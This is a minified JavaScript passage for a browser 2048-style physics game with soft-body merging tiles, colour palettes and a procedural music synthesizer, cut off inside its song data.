! function() {
    function t(t) {
        return Math.min((0 | .04 * Math.PI * t) << 1, 16)
    }

    function e() {
        P = new q(255, 360, 450, 180, !1)
    }

    function n() {
        A.clearRect(0, 0, T, S), A.save(), A.shadowColor = "rgba(0,0,0,0.4)", A.shadowBlur = 25, P.paint(A, "#0091EA"), A.shadowColor = "#000", A.translate(0, 1), at.paint(A, "rgba(55,71,79,0.4)"), ct.paint(A, "rgba(55,71,79,0.4)"), ft.paint(A, "rgba(55,71,79,0.4)"), A.restore()
    }

    function o(t, e, n) {
        t.style[e] = n + "px"
    }

    function s() {
        var t = window.innerWidth,
            e = window.innerHeight;
        t / e > B ? t = e * B : e = t / B, I = T / t, o(D, "width", t), o(D, "height", e), o(D, "left", .5 * (window.innerWidth - t)), o(D, "top", .5 * (window.innerHeight - e));
        var n = .5 * t / T,
            s = "scale3d(" + n + "," + n + ",1)";
        W.style[O] = s, V.style[O] = s
    }

    function i(t, e) {
        var n, o = null;
        return function() {
            function s() {
                var i = Date.now() - n;
                i < e ? o = setTimeout(s, e - i) : (o = null, t())
            }
            n = Date.now(), o || (o = setTimeout(s, e))
        }
    }

    function r(t) {
        var e = t.target;
        "INPUT" != e.tagName && "LABEL" != e.tagName && (t.preventDefault(), t.stopPropagation())
    }

    function a() {
        D.removeChild(W), x.play("new"), (y || I > 1) && document.body.requestFullscreen && document.body.requestFullscreen()
    }

    function c() {
        V.style.display = "block", x.play("win")
    }

    function f() {
        V.style.display = "none", x.play("new"), $ = [], tt = [], et = [], nt = null, ht.dragging = !1, h()
    }

    function l() {
        C.clearRect(0, 0, T, S);
        for (var t = 0, e = tt; t < e.length; t++) {
            var n = e[t];
            n.integrate()
        }
        for (var o, s = !1, i = function(t) {
                var e = $[t];
                e.center.y >= S + e.r && (et = et.filter(function(t) {
                    return t.parent != e
                }), tt = tt.filter(function(t) {
                    return t.parent != e
                }), nt && nt.parent == e && (nt = null, ht.dragging = !1), $.splice(t, 1), --it[e.n], x.play("die"), s = !0, --t), o = t
            }, r = 3; r < $.length; ++r) i(r), r = o;
        for (var a = function(t) {
                for (var e = $[t], n = 2.5 * e.r, o = 99999, i = null, r = 0, a = t + 1; a < $.length; ++a) {
                    var f = $[a];
                    if (e.n == f.n) {
                        var l = e.center.distance(f.center);
                        l < n && l < o && (o = l, i = f, r = a)
                    }
                }
                if (!i) return "continue";
                var _ = .5 * (e.center.x + i.center.x),
                    h = .5 * (e.center.y + i.center.y);
                if (o > 2 * e.r) {
                    for (var u = 0, d = e.positions; u < d.length; u++) {
                        var p = d[u];
                        p.x += (_ - p.x) * G, p.y += (h - p.y) * G
                    }
                    for (var v = 0, y = i.positions; v < y.length; v++) {
                        var p = y[v];
                        p.x += (_ - p.x) * G, p.y += (h - p.y) * G
                    }
                } else et = et.filter(function(t) {
                    return t.parent != e && t.parent != i
                }), tt = tt.filter(function(t) {
                    return t.parent != e && t.parent != i
                }), !nt || nt.parent != e && nt.parent != i || (nt = null, ht.dragging = !1), $.splice(r, 1), $[t] = new E(_, h, e.n << 1, !1), it[e.n] -= 2, x.play("bip"), s = !0, 1024 == e.n && c()
            }, r = 3; r < $.length - 1; ++r) a(r);
        s && rt(), nt && (nt.position.x += (ht.x - nt.position.x) * Z, nt.position.y += (ht.y - nt.position.y) * Z);
        for (var f = 0; f < J; ++f) {
            for (var _ = 0, h = et; _ < h.length; _++) {
                var u = h[_];
                u.solve()
            }
            for (var d = 0, p = $; d < p.length; d++) {
                var v = p[d];
                v.boundingBox()
            }
            for (var r = 0; r < $.length - 1; ++r)
                for (var y = r + 1; y < $.length; ++y) R($[r], $[y]) && U()
        }
        for (var m = 0, w = $; m < w.length; m++) {
            var v = w[m];
            v.paint(C)
        }
        nt && (C.beginPath(), C.moveTo(nt.position.x, nt.position.y), C.lineTo(ht.x, ht.y), C.strokeStyle = "#FFD600", C.stroke()), requestAnimationFrame(l)
    }

    function _() {
        return (.3 * Math.random() + .35) * T
    }

    function h() {
        for (var t = 2; t <= 2048; t *= 2) it[t] = 0;
        at = new q(280, 480, 400, 60), ct = new q(220, 420, 60, 120), ft = new q(680, 420, 60, 120), new w(at, at.handle0, ct.handle0, .1), new w(at, at.handle1, ft.handle1, .1);
        var e = .5 * S;
        new E(.35 * T, e), new E(.65 * T, e)
    }

    function u(t) {
        ht.x = (t.clientX - D.offsetLeft) * I, ht.y = (t.clientY - D.offsetTop) * I
    }

    function d() {
        for (var t = new lt, e = 0; e < 8; ++e) t.generate(e);
        ut = t.createAudio(), ut.loop = !0, ut.volume = .9
    }

    function p() {
        y && (document.body.className = "mobile");
        var t = document.getElementById("m"),
            e = document.getElementById("s"),
            o = document.getElementById("q");
        t.addEventListener("change", function(e) {
            ut && (t.checked ? (ut.currentTime = 0, ut.play()) : ut.pause())
        }), e.addEventListener("change", function(t) {
            x.on = e.checked
        });
        var s = q.prototype.paint,
            i = q.prototype.paintLow,
            r = E.prototype.paint,
            a = E.prototype.paintLow;
        y && (o.checked = !1, q.prototype.paint = i, E.prototype.paint = a), o.addEventListener("change", function(t) {
            q.prototype.paint = o.checked ? s : i, E.prototype.paint = o.checked ? r : a, n()
        }), D.removeChild(H), ut && ut.play()
    }
    var v = function() {
            function t() {
                this.on = !0, this.sounds = {}
            }
            return t.prototype.add = function(t, e, n) {
                this.sounds[t] = {
                    tick: 0,
                    count: e,
                    pool: []
                };
                for (var o = 0; o < e; ++o) {
                    var s = new Audio;
                    s.src = window.SOUND(n), this.sounds[t].pool.push(s)
                }
            }, t.prototype.play = function(t) {
                if (this.on) {
                    var e = this.sounds[t];
                    e.pool[e.tick].play(), ++e.tick >= e.count && (e.tick = 0)
                }
            }, t
        }(),
        x = new v,
        y = null != navigator.userAgent.match(/Android|iPhone|iPad/i);
    y ? x.on = !1 : (x.add("bip", 9, [1, , .1241, , .1855, .5336, , , , , , , , , , , , , 1, , , .1, , .64]), x.add("die", 4, [1, .0013, .3576, .0681, .8007, .5117, , -.3453, .0049, .148, -.2563, -.2717, .2608, , -.3543, -.1884, -.0106, -.0281, .9971, -.6629, -.7531, .0097, -.0086, .5]), x.add("new", 2, [1, , .2548, , .1007, .7539, .0996, -.5302, , , , , , .7769, -.4436, , , , 1, , , , , .5]), x.add("win", 1, [1, .0309, .5597, .0464, .7472, .369, , -.1366, , -.3111, , -.1581, -.8665, , -.0414, .2802, .0258, -.1198, .9955, .1759, , , -5e-4, .64]));
    var m = function() {
            function t(t) {
                void 0 === t && (t = 1), this.vertices = [], this.positions = [], this.constraints = [], this.boundaries = [], this.center = new k, this.halfExtents = new k, this.mass = t
            }
            return t.prototype.boundingBox = function() {
                for (var t = 99999, e = 99999, n = -99999, o = -99999, s = 0, i = this.positions; s < i.length; s++) {
                    var r = i[s];
                    r.x < t && (t = r.x), r.y < e && (e = r.y), r.x > n && (n = r.x), r.y > o && (o = r.y)
                }
                this.center.set(.5 * (t + n), .5 * (e + o)), this.halfExtents.set(.5 * (n - t), .5 * (o - e))
            }, t.prototype.project = function(t) {
                this._min = 99999, this._max = -99999;
                for (var e = 0, n = this.positions; e < n.length; e++) {
                    var o = n[e],
                        s = o.dot(t);
                    s < this._min && (this._min = s), s > this._max && (this._max = s)
                }
            }, t.prototype.drag = function() {
                if (ht.dragging && !nt && C.isPointInPath(ht.x, ht.y))
                    for (var t = 99999, e = 0, n = this.vertices; e < n.length; e++) {
                        var o = n[e],
                            s = o.position.distance(ht);
                        s < t && (t = s, nt = o)
                    }
            }, t
        }(),
        w = function() {
            function t(t, e, n, o, s) {
                void 0 === s && (s = !1), this.parent = t, this.v0 = e, this.v1 = n, this.p0 = e.position, this.p1 = n.position, this.length = this.p0.distance(this.p1), this.stiffness = o, this.isBoundary = s, t.constraints.push(this), s && t.boundaries.push(this), et.push(this)
            }
            return t.prototype.solve = function() {
                ot.setSubtract(this.p0, this.p1);
                var t = ot.length();
                t && (ot.multiplyScalar(this.stiffness * (this.length - t) / t), this.p0.add(ot), this.p1.subtract(ot))
            }, t
        }(),
        g = this && this.__extends || function(t, e) {
            function n() {
                this.constructor = t
            }
            for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
            t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n)
        },
        q = function(t) {
            function e(n, o, s, i, r) {
                void 0 === r && (r = !0), t.call(this, 250);
                var a = this.handle0 = new M(this, n, o + e.chamfer),
                    c = new M(this, n + e.chamfer, o),
                    f = new M(this, n + s - e.chamfer, o),
                    l = this.handle1 = new M(this, n + s, o + e.chamfer),
                    _ = new L(this, n + s, o + i),
                    h = new L(this, n, o + i);
                new w(this, a, c, .1, !0), new w(this, c, f, .1, !0), new w(this, f, l, .1, !0), new w(this, l, _, .1, !0), new w(this, _, h, .1, !0), new w(this, h, a, .1, !0), new w(this, a, l, .1), new w(this, a, _, .1), new w(this, c, _, .1), new w(this, c, h, .1), new w(this, f, _, .1), new w(this, f, h, .1), new w(this, l, h, .1), r && $.push(this)
            }
            return g(e, t), e.prototype.paint = function(t, e) {
                t.beginPath();
                var n = this.positions[0],
                    o = this.positions[1];
                t.moveTo(.5 * (n.x + o.x), .5 * (n.y + o.y));
                for (var s = 1; s <= 6; ++s) 4 != s && 5 != s ? (n = this.positions[s % 6], o = this.positions[(s + 1) % 6], t.quadraticCurveTo(n.x, n.y, .5 * (n.x + o.x), .5 * (n.y + o.y))) : t.lineTo(this.positions[s].x, this.positions[s].y);
                t.fillStyle = e || "#00B0FF", t.fill()
            }, e.prototype.paintLow = function(t, e) {
                t.beginPath();
                for (var n = 0, o = this.positions; n < o.length; n++) {
                    var s = o[n];
                    t.lineTo(s.x, s.y)
                }
                t.fillStyle = e || "#00B0FF", t.fill()
            }, e.chamfer = 10, e
        }(m),
        g = this && this.__extends || function(t, e) {
            function n() {
                this.constructor = t
            }
            for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
            t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n)
        },
        b = {};
    // Color palettes
    var defaultP = ["eee4da", "ede0c8", "f2b179", "f59563", "f67c5f", "f65e3b", "edcf72", "edcc61", "edc850", "edc53f", "edc22e"];
    var bluesP = ["E1F5FE", "B3E5FC", "81D4FA", "4FC3F7", "29B6F6", "03A9F4", "039BE5", "0288D1", "0277BD", "01579B", "014982"];
    var rainbowP = ["FF0000", "FF8000", "FFFF00", "80FF00", "00FF00", "00FF80", "00FFFF", "0080FF", "0000FF", "8000FF", "FF00FF"];
    var pastelP = ["FEAEB1", "FFB796", "FFC593", "FBD49B", "F6E396", "CAE692", "AEDB96", "96DC7A", "8CDCDB", "87B0C6", "C3A4C3"];
    var beachP = ["FB5C59", "FB8C57", "FBAF59", "FDCB74", "FCE273", "FAF5E1", "F6E9BC", "8ADAD7", "71CEC3", "4FC1C1", "4FB3C2"];
    var colorPalette = defaultP;
    ~colorPalette.forEach(function(t, e) {
        b[Math.pow(2, e + 1)] = "#" + t
    });
    var E = function(e) {
            function n(n, o, s, i) {
                void 0 === o && (o = -40), void 0 === s && (s = 2), void 0 === i && (i = !0), e.call(this, 1 + .2 * Math.log10(s)), ++it[this.n = s], this.r = 40 + 4 * (Math.log2(s) - 1), this.font = "bold " + (.1 * this.r + 28) + "px 'Segoe UI','Helvetica Neue',sans-serif";
                for (var r = t(this.r), a = 2 * Math.PI / r, c = 0; c < r; ++c) {
                    var f = c * a;
                    new M(this, n + this.r * Math.cos(f), o + this.r * Math.sin(f))
                }
                for (var c = 0; c < r - 1; ++c)
                    for (var l = c + 1; l < r; ++l) new w(this, this.vertices[c], this.vertices[l], .005, l == c + 1);
                i && (this.boundingBox(), $.push(this))
            }
            return g(n, e), n.prototype.paint = function(t) {
                t.beginPath();
                var e = this.positions[0],
                    n = this.positions[1];
                t.moveTo(.5 * (e.x + n.x), .5 * (e.y + n.y));
                for (var o = 1; o <= this.positions.length; ++o) e = this.positions[o % this.positions.length], n = this.positions[(o + 1) % this.positions.length], t.quadraticCurveTo(e.x, e.y, .5 * (e.x + n.x), .5 * (e.y + n.y));
                t.fillStyle = b[this.n], t.fill(), t.save(), t.translate(this.center.x, this.center.y), t.rotate(Math.atan2(e.y - this.center.y, e.x - this.center.x)), t.font = this.font, t.fillStyle = this.n > 4 ? "#f9f6f2" : "#776e65", t.fillText("" + this.n, 0, 0), t.restore(), this.drag()
            }, n.prototype.paintLow = function(t) {
                t.beginPath();
                var e = this.boundaries[0].p0;
                t.moveTo(e.x, e.y);
                for (var n = 0, o = this.boundaries; n < o.length; n++) {
                    var s = o[n].p1;
                    t.lineTo(s.x, s.y)
                }
                t.fillStyle = b[this.n], t.fill(), t.save(), t.translate(this.center.x, this.center.y), t.rotate(Math.atan2(e.y - this.center.y, e.x - this.center.x)), t.font = this.font, t.fillStyle = this.n > 4 ? "#f9f6f2" : "#776e65", t.fillText("" + this.n, 0, 0), t.restore(), this.drag()
            }, n
        }(m),
        M = function() {
            function t(t, e, n) {
                this.parent = t, this.position = new k(e, n), this.oldPosition = new k(e, n), t.vertices.push(this), t.positions.push(this.position), tt.push(this)
            }
            return t.prototype.integrate = function() {
                var t = this.position,
                    e = this.oldPosition,
                    n = t.x,
                    o = t.y;
                t.x += t.x - e.x, t.y += t.y - e.y + Y, e.set(n, o), t.y < -100 ? t.y = -100 : t.y >= N.height + 250 && (t.x -= (t.x - e.x) * Q, t.y = N.height - 1), t.x < 0 ? t.x = 0 : t.x >= N.width && (t.x = N.width - 1)
            }, t
        }(),
        g = this && this.__extends || function(t, e) {
            function n() {
                this.constructor = t
            }
            for (var o in e) e.hasOwnProperty(o) && (t[o] = e[o]);
            t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n)
        },
        L = function(t) {
            function e(e, n, o) {
                t.call(this, e, n, o), this.x = n, this.y = o
            }
            return g(e, t), e.prototype.integrate = function() {
                this.position.set(this.x, this.y), this.oldPosition.set(this.x, this.y)
            }, e
        }(M),
        k = function() {
            function t(t, e) {
                void 0 === t && (t = 0), void 0 === e && (e = 0), this.x = t, this.y = e
            }
            return t.prototype.set = function(t, e) {
                this.x = t, this.y = e
            }, t.prototype.setTo = function(t) {
                this.x = t.x, this.y = t.y
            }, t.prototype.length = function() {
                return Math.sqrt(this.x * this.x + this.y * this.y)
            }, t.prototype.distance = function(t) {
                var e = this.x - t.x,
                    n = this.y - t.y;
                return Math.sqrt(e * e + n * n)
            }, t.prototype.add = function(t) {
                this.x += t.x, this.y += t.y
            }, t.prototype.subtract = function(t) {
                this.x -= t.x, this.y -= t.y
            }, t.prototype.setSubtract = function(t, e) {
                this.x = t.x - e.x, this.y = t.y - e.y
            }, t.prototype.dot = function(t) {
                return this.x * t.x + this.y * t.y
            }, t.prototype.multiplyScalar = function(t) {
                this.x *= t, this.y *= t
            }, t.prototype.setMultiplyScalar = function(t, e) {
                this.x = t.x * e, this.y = t.y * e
            }, t.prototype.setNormal = function(t, e) {
                var n = t.y - e.y,
                    o = e.x - t.x,
                    s = Math.sqrt(n * n + o * o);
                if (s < Number.MIN_VALUE) return this.x = n, void(this.y = o);
                var i = 1 / s;
                this.x = n * i, this.y = o * i
            }, t
        }(),
        P = null,
        T = 960,
        S = 540,
        B = 16 / 9,
        I = 1,
        D = document.getElementById("container"),
        F = document.getElementById("backcanvas"),
        N = document.getElementById("canvas"),
        A = F.getContext("2d"),
        C = N.getContext("2d"),
        O = "transform";
    O in D.style || (O = "webkitTransform"), F.width = N.width = T, F.height = N.height = S, C.lineWidth = 2, C.textAlign = "center", C.textBaseline = "middle", window.addEventListener("resize", s), window.addEventListener("orientationchange", s), N.addEventListener("contextmenu", function(t) {
        t.preventDefault()
    });
    var j = function() {
            function t(t, e) {
                if (Math.abs(e.center.x - t.center.x) - (t.halfExtents.x + e.halfExtents.x) >= 0 || Math.abs(e.center.y - t.center.y) - (t.halfExtents.y + e.halfExtents.y) >= 0) return !1;
                n = 99999;
                for (var r = 0, a = [t, e]; r < a.length; r++)
                    for (var c = a[r], f = 0, l = c.boundaries; f < l.length; f++) {
                        var _ = l[f];
                        ot.setNormal(_.p0, _.p1), t.project(ot), e.project(ot);
                        var h = t._min < e._min ? e._min - t._max : t._min - e._max;
                        if (h > 0) return !1;
                        h *= -1, h < n && (n = h, i.setTo(ot), o = _)
                    }
                if (o.parent != e) {
                    var u = t;
                    t = e, e = u
                }
                ot.setSubtract(t.center, e.center), ot.dot(i) < 0 && i.multiplyScalar(-1);
                for (var d = 99999, p = 0, v = t.vertices; p < v.length; p++) {
                    var x = v[p];
                    ot.setSubtract(x.position, e.center);
                    var h = i.dot(ot);
                    h < d && (d = h, s = x)
                }
                return !0
            }

            function e() {
                var t = o.p0,
                    e = o.p1,
                    r = o.v0.oldPosition,
                    a = o.v1.oldPosition,
                    c = s.position,
                    f = s.oldPosition;
                ot.setMultiplyScalar(i, n);
                var l = Math.abs(t.x - e.x) > Math.abs(t.y - e.y) ? (c.x - ot.x - t.x) / (e.x - t.x) : (c.y - ot.y - t.y) / (e.y - t.y),
                    _ = 1 / (l * l + (1 - l) * (1 - l)),
                    h = s.parent.mass,
                    u = o.parent.mass,
                    d = h + u;
                h /= 2 * d, u /= d;
                var p = (1 - l) * _ * h,
                    v = l * _ * h;
                t.x -= ot.x * p, t.y -= ot.y * p, e.x -= ot.x * v, e.y -= ot.y * v, c.x += ot.x * u, c.y += ot.y * u, ot.set(c.x - f.x - .5 * (t.x + e.x - r.x - a.x), c.y - f.y - .5 * (t.y + e.y - r.y - a.y)), st.set(-i.y, i.x), ot.setMultiplyScalar(st, ot.dot(st)), r.x -= ot.x * K * p, r.y -= ot.y * K * p, a.x -= ot.x * K * v, a.y -= ot.y * K * v, f.x += ot.x * K * u, f.y += ot.y * K * u
            }
            var n, o, s, i = new k;
            return [t, e]
        }(),
        R = j[0],
        U = j[1],
        H = document.getElementById("load"),
        W = document.getElementById("home"),
        z = document.getElementById("start"),
        V = document.getElementById("end"),
        X = document.getElementById("reset");
    W.addEventListener("mousedown", r), W.addEventListener("touchstart", r), z.addEventListener("mousedown", a), z.addEventListener("touchstart", a), V.addEventListener("mousedown", r), V.addEventListener("touchstart", r), X.addEventListener("mousedown", f), X.addEventListener("touchstart", f);
    var Y = .6,
        G = .1,
        J = 40,
        K = .9,
        Q = .6,
        Z = .24,
        $ = [],
        tt = [],
        et = [],
        nt = null,
        ot = new k,
        st = new k,
        it = {},
        rt = i(function() {
            var t = it[256] || it[512] || it[1024];
            it[2] ? new E(_()) : it[4] ? new E(_(), -44, 4) : t ? it[8] ? new E(_(), -48, 8) : (new E(.35 * T, -44, 4), new E(.65 * T, -44, 4)) : (new E(.35 * T), new E(.65 * T)), x.play("new")
        }, 300),
        at = null,
        ct = null,
        ft = null,
        lt = function() {
            function t(t) {
                return Math.sin(6.283184 * t)
            }

            function e(e) {
                return t(e) < 0 ? -1 : 1
            }

            function n(t) {
                return t % 1 - .5
            }

            function o(t) {
                var e = t % 1 * 4;
                return e < 2 ? e - 1 : 3 - e
            }

            function s(t) {
                return .00390625 * Math.pow(1.059463094, t - 128)
            }
            var i, r, a = 44100,
                c = 2,
                f = a * _t.songLen;
            ! function() {
                var t = Math.ceil(Math.sqrt(f * c / 2)),
                    e = document.createElement("canvas").getContext("2d");
                i = e.createImageData(t, t).data;
                var n, o = e.createImageData(t, t).data;
                for (n = t * t * 4 - 2; n >= 0; n -= 2) o[n] = 0, o[n + 1] = 128;
                r = o
            }(), this.lps = a / _t.rowLen, this.generate = function(l) {
                var _, h, u, d, p, v, x, y, m, w, g, q, b, E, M, L, k, P, T, S, B, I, D = [t, e, n, o],
                    F = i,
                    N = r,
                    A = f,
                    C = f * c * 2,
                    O = _t.songData[l],
                    j = _t.rowLen,
                    R = D[O.lfo_waveform],
                    U = D[O.osc1_waveform],
                    H = D[O.osc2_waveform],
                    W = O.env_attack,
                    z = O.env_sustain,
                    V = O.env_release,
                    X = Math.pow(2, O.fx_pan_freq - 8) / j,
                    Y = Math.pow(2, O.lfo_freq - 8) / j;
                for (u = 0; u < C; u += 2) F[u] = 0, F[u + 1] = 128;
                for (x = 0, d = 0; d < _t.endPattern - 1; ++d)
                    for (y = O.p[d], p = 0; p < 32; ++p) {
                        if (y && (v = O.c[y - 1].n[p]))
                            for (m = w = 0, B = s(v + 12 * (O.osc1_oct - 8) + O.osc1_det) * (1 + 8e-4 * O.osc1_detune), I = s(v + 12 * (O.osc2_oct - 8) + O.osc2_det) * (1 + 8e-4 * O.osc2_detune), g = O.fx_resonance / 255, q = b = 0, _ = W + z + V - 1; _ >= 0; --_) {
                                switch (h = _ + x, L = R(h * Y) * O.lfo_amt / 512 + .5, k = 1, _ < W ? k = _ / W : _ >= W + z && (k -= (_ - W - z) / V), M = B, O.lfo_osc1_freq && (M += L), O.osc1_xenv && (M *= k * k), m += M, T = U(m) * O.osc1_vol, M = I, O.osc2_xenv && (M *= k * k), w += M, T += H(w) * O.osc2_vol, O.noise_fader && (T += (2 * Math.random() - 1) * O.noise_fader * k), T *= k / 255, S = O.fx_freq, O.lfo_fx_freq && (S *= L), S = 1.5 * Math.sin(3.141592 * S / a), q += S * b, E = g * (T - b) - q, b += S * E, O.fx_filter) {
                                    case 1:
                                        T = E;
                                        break;
                                    case 2:
                                        T = q;
                                        break;
                                    case 3:
                                        T = b;
                                        break;
                                    case 4:
                                        T = q + E
                                }
                                M = t(h * X) * O.fx_pan_amt / 512 + .5, T *= 39 * O.env_master, h <<= 2, P = F[h] + (F[h + 1] << 8) + T * (1 - M), F[h] = 255 & P, F[h + 1] = P >> 8 & 255, P = F[h + 2] + (F[h + 3] << 8) + T * M, F[h + 2] = 255 & P, F[h + 3] = P >> 8 & 255
                            }
                        x += j
                    }
                for (d = O.fx_delay_time * j >> 1, M = O.fx_delay_amt / 255, v = 0; v < A - d; ++v) u = 4 * v, h = 4 * (v + d), P = F[h] + (F[h + 1] << 8) + (F[u + 2] + (F[u + 3] << 8) - 32768) * M, F[h] = 255 & P, F[h + 1] = P >> 8 & 255, P = F[h + 2] + (F[h + 3] << 8) + (F[u] + (F[u + 1] << 8) - 32768) * M, F[h + 2] = 255 & P, F[h + 3] = P >> 8 & 255;
                for (u = 0; u < C; u += 2) P = N[u] + (N[u + 1] << 8) + F[u] + (F[u + 1] << 8) - 32768, N[u] = 255 & P, N[u + 1] = P >> 8 & 255
            }, this.createAudio = function() {
                var t, e, n, o, s, a, l, _, h = r,
                    u = f * c * 2;
                for (i = null, s = u - 8, a = s - 36, o = String.fromCharCode(82, 73, 70, 70, 255 & s, s >> 8 & 255, s >> 16 & 255, s >> 24 & 255, 87, 65, 86, 69, 102, 109, 116, 32, 16, 0, 0, 0, 1, 0, 2, 0, 68, 172, 0, 0, 16, 177, 2, 0, 4, 0, 16, 0, 100, 97, 116, 97, 255 & a, a >> 8 & 255, a >> 16 & 255, a >> 24 & 255), t = 0; t < u;) {
                    for (n = "", e = 0; e < 256 && t < u; ++e, t += 2) _ = 4 * (h[t] + (h[t + 1] << 8) - 32768), _ = _ < -32768 ? -32768 : _ > 32767 ? 32767 : _, n += String.fromCharCode(255 & _, _ >> 8 & 255);
                    o += n
                }
                return l = "data:audio/wav;base64," + btoa(o), o = null, new Audio(l)
            }, this.getData = function(t, e) {
                for (var n = Math.floor(t * a), o = 0, s = [], i = r; o < 2 * e; o += 2) {
                    var c = 4 * (n + o) + 1;
                    s.push(t > 0 && c < i.length ? (i[c] + i[c - 1] / 256) / 256 : .5)
                }
                return s
            }
        },
        _t = {
            songLen: 37,
            songData: [{
                osc1_oct: 7,
                osc1_det: 0,
                osc1_detune: 0,
                osc1_xenv: 0,
                osc1_vol: 192,
                osc1_waveform: 3,
                osc2_oct: 7,
                osc2_det: 0,
                osc2_detune: 7,
                osc2_xenv: 0,
                osc2_vol: 201,
                osc2_waveform: 3,
                noise_fader: 0,
                env_attack: 789,
                env_sustain: 1234,
                env_release: 13636,
                env_master: 191,
                fx_filter: 2,
                fx_freq: 5839,
                fx_resonance: 254,
                fx_delay_time: 6,
                fx_delay_amt: 121,
                fx_pan_freq: 6,
                fx_pan_amt: 147,
                lfo_osc1_freq: 0,
                lfo_fx_freq: 1,
                lfo_freq: 6,
                lfo_amt: 195,
                lfo_waveform: 0,
                p: [1, 2, 0, 0, 1, 2, 1, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
                c: [{
                    n: [154, 0, 154, 0, 152, 0, 147, 0, 0, 0, 0, 0, 0, 0, 0, 0, 154, 0, 154, 0, 152, 0, 157, 0, 0, 0, 156, 0, 0, 0, 0, 0]
                }, {
                    n: [154, 0, 154, 0, 152, 0, 147, 0, 0, 0, 0, 0, 0, 0, 0, 0, 154, 0, 154, 0, 152, 0, 157, 0, 0, 0, 159, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }]
            }, {
                osc1_oct: 7,
                osc1_det: 0,
                osc1_detune: 0,
                osc1_xenv: 0,
                osc1_vol: 255,
                osc1_waveform: 2,
                osc2_oct: 8,
                osc2_det: 0,
                osc2_detune: 18,
                osc2_xenv: 1,
                osc2_vol: 191,
                osc2_waveform: 2,
                noise_fader: 0,
                env_attack: 3997,
                env_sustain: 56363,
                env_release: 1e5,
                env_master: 255,
                fx_filter: 2,
                fx_freq: 392,
                fx_resonance: 255,
                fx_delay_time: 8,
                fx_delay_amt: 69,
                fx_pan_freq: 5,
                fx_pan_amt: 67,
                lfo_osc1_freq: 0,
                lfo_fx_freq: 1,
                lfo_freq: 4,
                lfo_amt: 57,
                lfo_waveform: 3,
                p: [1, 2, 1, 2, 1, 2, 1, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
                c: [{
                    n: [130, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [123, 0, , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }, {
                    n: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
                }]
            }, {
